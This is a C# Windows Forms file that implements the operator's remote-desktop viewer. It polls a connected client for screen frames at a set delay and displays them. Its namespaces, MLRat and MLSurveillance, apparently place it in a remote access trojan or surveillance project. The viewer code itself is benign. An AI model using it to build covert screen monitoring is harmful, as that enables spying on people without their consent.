using MLRat.Server;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLSurveillanceServer.Forms
{
    public partial class RemoteDesktopForm : Form
    {
        bool running = false;
        int delay = 1000;
        public IClient Client { get; private set; }
        public RemoteDesktopForm(IClient _client)
        {
            Client = _client;
            InitializeComponent();
        }

        private void RemoteDesktopForm_Load(object sender, EventArgs e)
        {

        }

        public void Destroy()
        {
            Dispose();
        }

        public void SetImage(Image img)
        {
            Invoke((MethodInvoker)delegate ()
            {
                pbScreen.Image = img;
            });
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (running)
                return;
            btnStop.Enabled = true;
            btnStart.Enabled = false;
            new Thread(RDThread).Start();
        }

        private void RDThread()
        {
            running = true;
            while (running)
            {
                Client.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.RequestFrame);
                Thread.Sleep(delay);
            }
            Invoke((MethodInvoker)delegate ()
            {
                btnStart.Enabled = true;
                btnStop.Enabled = false;
                btnStop.Text = "Stop";
            });
        }

        private void nudDelay_ValueChanged(object sender, EventArgs e)
        {
            delay = (int)nudDelay.Value;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            running = false;
            btnStop.Text = "Stopping...";
        }
    }
}
